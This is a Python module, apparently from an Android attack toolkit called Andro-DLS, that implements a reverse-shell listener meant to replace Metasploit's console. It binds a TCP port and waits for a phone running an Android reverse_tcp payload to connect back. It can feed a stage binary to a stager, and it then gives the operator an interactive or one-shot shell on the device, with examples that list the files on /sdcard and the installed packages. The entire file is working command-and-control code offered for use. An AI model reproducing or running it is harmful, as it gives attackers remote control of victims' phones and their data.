"""Pure-Python interactive remote shell — replaces msfconsole for payload sessions.

Listener binds a TCP port; the Android payload (android/shell/reverse_tcp)
connects back. We then provide an interactive shell (or one-shot commands)
directly in the Andro-DLS CLI. No Metasploit needed.

Usage (from CLI): option `Full Access` → auto pipeline → shell
Direct:  python -m modules.shell_access listen 127.0.0.1 4444
         python -m modules.shell_access once 127.0.0.1 4444 "id; ls /sdcard"
"""
from __future__ import annotations

import argparse
import socket
import sys
import time
from pathlib import Path

BANNER = r"""
  ┌───────────────────────────────────────────────┐
  │  DLS-GEEK REMOTE SHELL  (tcp://{host}:{port}) │
  │  Type 'exit' to close · Ctrl+C to detach      │
  └───────────────────────────────────────────────┘
"""


def _recv_until_marker(conn: socket.socket, marker: bytes = b"__DLS_DONE__",
                       max_wait: float = 15.0) -> bytes:
    """Read until the marker line appears (device shell has no prompt)."""
    conn.setblocking(False)
    data = b""
    deadline = time.time() + max_wait
    while time.time() < deadline:
        try:
            chunk = conn.recv(4096)
            if not chunk:
                break
            data += chunk
            if marker in data:
                break
        except BlockingIOError:
            time.sleep(0.05)
        except OSError:
            break
    conn.setblocking(True)
    # strip the marker line itself
    cleaned = data.replace(marker + b"\n", b"").replace(marker, b"")
    return cleaned


def run_cmd(conn: socket.socket, cmd: str) -> str:
    """Send one command, wait for marker, return output."""
    full = f"{cmd}; echo __DLS_DONE__"
    try:
        conn.sendall(full.encode() + b"\n")
    except OSError:
        return "[!] connection lost"
    return _recv_until_marker(conn).decode("utf-8", "replace")


def wait_for_shell(listener: socket.socket, timeout: float = 60.0) -> socket.socket:
    """Accept the first incoming payload connection."""
    print(f"[*] waiting for device to connect (max {timeout:.0f}s)...", flush=True)
    listener.settimeout(timeout)
    try:
        conn, addr = listener.accept()
    except socket.timeout:
        raise TimeoutError("no device connected")
    print(f"[+] device connected from {addr[0]}:{addr[1]}", flush=True)
    listener.settimeout(None)
    return conn


def accept_stage_then_shell(
    listener: socket.socket,
    stage_file: str,
    timeout: float = 90.0,
) -> socket.socket:
    """Staged payloads: first connection = stager (feed it stage bytes),
    second connection = real shell. Returns the shell socket."""
    stage = Path(stage_file).read_bytes() if Path(stage_file).exists() else b""
    if not stage:
        print("[!] stage file missing — falling back to plain shell accept")
        return wait_for_shell(listener, timeout)
    print(f"[*] sending {len(stage)}-byte stage to stager...", flush=True)
    conn, _ = listener.accept()
    try:
        conn.sendall(stage)
    except OSError:
        pass
    # the android stager runs the stage on THIS SAME socket; no second connection.
    print("[+] shell up — interactive on same connection", flush=True)
    return conn


def interactive(conn: socket.socket, prompt: str = "device$ ") -> None:
    """REPL: send lines to device shell, print replies."""
    print(BANNER.format(host="-", port="-"))
    while True:
        try:
            line = input(prompt)
        except (EOFError, KeyboardInterrupt):
            print("\n[!] detached")
            break
        cmd = line.strip()
        if cmd in ("exit", "quit"):
            print("[*] bye")
            break
        if cmd in ("help", "?"):
            print(
                "available: any shell command · exit · (Ctrl-D to detach)\n"
                "  e.g. id · ls /sdcard · getprop ro.product.model · pm list packages"
            )
            continue
        if not cmd:
            continue
        # interactive mode: read until 2.5s quiet OR 30s max (device sh has no prompt)
        try:
            conn.sendall(cmd.encode() + b"\n")
        except OSError:
            print("[!] connection lost")
            break
        out = _read_quiet(conn, quiet=2.5, max_wait=30.0)
        if out:
            sys.stdout.write(out)

# interactive mode: read until quiet window passes, print as it comes
def _read_quiet(conn: socket.socket, quiet: float = 2.5, max_wait: float = 30.0) -> str:
    conn.setblocking(False)
    data = b""
    last = time.time()
    deadline = time.time() + max_wait
    while time.time() < deadline:
        try:
            chunk = conn.recv(4096)
            if not chunk:
                break
            data += chunk
            last = time.time()
        except BlockingIOError:
            if data and time.time() - last > quiet:
                break
            time.sleep(0.05)
        except OSError:
            break
    conn.setblocking(True)
    return data.decode("utf-8", "replace")


def once(conn: socket.socket, cmd: str) -> str:
    return run_cmd(conn, cmd)


def run(listen_host: str = "127.0.0.1", listen_port: int = 4444,
        one_shot: str | None = None, timeout: float = 60.0,
        stage_file: str | None = None) -> None:
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        listener.bind((listen_host, listen_port))
    except OSError as e:
        print(f"[!] cannot bind {listen_host}:{listen_port} — {e}", file=sys.stderr)
        raise SystemExit(1)
    listener.listen(4)
    print(f"[*] shell listener on {listen_host}:{listen_port}")
    if stage_file:
        conn = accept_stage_then_shell(listener, stage_file, timeout)
    else:
        conn = wait_for_shell(listener, timeout)
    if one_shot:
        print(once(conn, one_shot))
        conn.close()
        return
    try:
        interactive(conn)
    finally:
        conn.close()


def main() -> None:
    p = argparse.ArgumentParser(description="Interactive payload shell")
    sub = p.add_subparsers(dest="mode", required=True)
    l = sub.add_parser("listen", help="accept one device then interact")
    l.add_argument("host", nargs="?", default="127.0.0.1")
    l.add_argument("port", nargs="?", type=int, default=4444)
    l.add_argument("--stage", default=None, help="stage.bin file for staged payloads")
    o = sub.add_parser("once", help="one command, print result, exit")
    o.add_argument("host", nargs="?", default="127.0.0.1")
    o.add_argument("port", nargs="?", type=int, default=4444)
    o.add_argument("cmd", nargs="+", default=["id"])
    o.add_argument("--stage", default=None, help="stage.bin file for staged payloads")
    args = p.parse_args()
    if args.mode == "once":
        run(args.host, args.port, one_shot=" ".join(args.cmd), stage_file=args.stage)
    else:
        run(args.host, args.port, stage_file=args.stage)


if __name__ == "__main__":
    main()